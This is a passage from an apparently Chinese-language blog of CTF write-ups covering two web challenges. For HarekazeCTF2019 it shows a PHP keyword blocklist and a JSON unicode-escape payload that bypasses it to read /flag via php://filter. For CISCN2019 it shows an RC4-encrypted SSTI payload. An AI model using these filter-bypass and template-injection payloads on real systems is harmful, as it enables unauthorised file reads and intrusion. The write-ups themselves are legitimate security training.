<p><a href="https://zhuanlan.zhihu.com/p/603142951">https://zhuanlan.zhihu.com/p/603142951</a></p>
<p><a href="https://github.com/gehaxelt/Python-dsstore">https://github.com/gehaxelt/Python-dsstore</a></p>
<hr>
<h2 id="harekazectf2019encode_and_encode">[HarekazeCTF2019]encode_and_encode<a hidden class="anchor" aria-hidden="true" href="#harekazectf2019encode_and_encode">#</a></h2>
<p>query.php：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span> <span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;source&#39;</span>])) {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">show_source</span>(<span style="color:#66d9ef">__FILE__</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">exit</span>();
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">is_valid</span>($str) {
</span></span><span style="display:flex;"><span>  $banword <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// no path traversal
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#39;\.\.&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// no stream wrapper
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#39;(php|file|glob|data|tp|zip|zlib|phar):&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// no data exfiltration
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#39;flag&#39;</span>
</span></span><span style="display:flex;"><span>  ];
</span></span><span style="display:flex;"><span>  $regexp <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">implode</span>(<span style="color:#e6db74">&#39;|&#39;</span>, $banword) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;/i&#39;</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>($regexp, $str)) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$body <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>(<span style="color:#e6db74">&#39;php://input&#39;</span>);
</span></span><span style="display:flex;"><span>$json <span style="color:#f92672">=</span> <span style="color:#a6e22e">json_decode</span>($body, <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">is_valid</span>($body) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isset</span>($json) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isset</span>($json[<span style="color:#e6db74">&#39;page&#39;</span>])) {
</span></span><span style="display:flex;"><span>  $page <span style="color:#f92672">=</span> $json[<span style="color:#e6db74">&#39;page&#39;</span>];
</span></span><span style="display:flex;"><span>  $content <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>($page);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$content <span style="color:#f92672">||</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">is_valid</span>($content)) {
</span></span><span style="display:flex;"><span>    $content <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&lt;p&gt;not found&lt;/p&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>  $content <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;p&gt;invalid request&lt;/p&gt;&#39;</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// no data exfiltration!!!
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$content <span style="color:#f92672">=</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#39;/HarekazeCTF\{.+\}/i&#39;</span>, <span style="color:#e6db74">&#39;HarekazeCTF{&amp;lt;censored&amp;gt;}&#39;</span>, $content);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">json_encode</span>([<span style="color:#e6db74">&#39;content&#39;</span> <span style="color:#f92672">=&gt;</span> $content]); 
</span></span></code></pre></div><p>json解析有对\uxxxx解码的特性，可以利用json_decode绕过关键字过滤，实现php伪协议读取flag：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;page&#34;</span>:<span style="color:#e6db74">&#34;\u0070hp://filter/convert.base64-encode/resource=/fla\u0067&#34;</span>}
</span></span></code></pre></div><p>flag{6f77661e-36e2-4a89-bc91-1de70d9d651a}</p>
<hr>
<h2 id="ciscn2019-华东南赛区double-secret">[CISCN2019 华东南赛区]Double Secret<a hidden class="anchor" aria-hidden="true" href="#ciscn2019-华东南赛区double-secret">#</a></h2>
<p>访问/secret，要传入参数secret，多试几次就有报错信息，查看app.py：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(secret<span style="color:#f92672">==</span><span style="color:#66d9ef">None</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;Tell me your secret.I will encrypt it so others can</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">t see&#39;</span>
</span></span><span style="display:flex;"><span>    rc<span style="color:#f92672">=</span>rc4_Modified<span style="color:#f92672">.</span>RC4(<span style="color:#e6db74">&#34;HereIsTreasure&#34;</span>)   <span style="color:#75715e">#解密</span>
</span></span><span style="display:flex;"><span>    deS<span style="color:#f92672">=</span>rc<span style="color:#f92672">.</span>do_crypt(secret)
</span></span><span style="display:flex;"><span>    a<span style="color:#f92672">=</span>render_template_string(safe(deS))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;ciscn&#39;</span> <span style="color:#f92672">in</span> a<span style="color:#f92672">.</span>lower():
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;flag detected!&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> a
</span></span></code></pre></div><p>SSTI+RC4+URLencode：</p>
<pre tabindex="0"><code>.%14%1E%12ä84mg%C2%9CË%00%C2%81%C2%8D¸%C2%97%0B%C2%9EF%3B%C2%88m®M5%C2%96%3D%C2%9D[Ø7ê%12´%05%C2%84A¿%17ÛhÏ%C2%8Fáa%0F®%09%C2%A0®yS*¢d|%C2%98/%00%C2%90é%03Y²Û%1F¶H%3D%0A%23ñ[%C2%9Cp®n%C2%96i]v%7FX%C2%92
</code></pre><p>&lsquo;class&rsquo; is not allowed. Secret is flag{4bc7eb1c-3a08-469d-a3f9-312f26ad4c31}</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://z9nn8w.github.io/">w8nn9z Blog</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
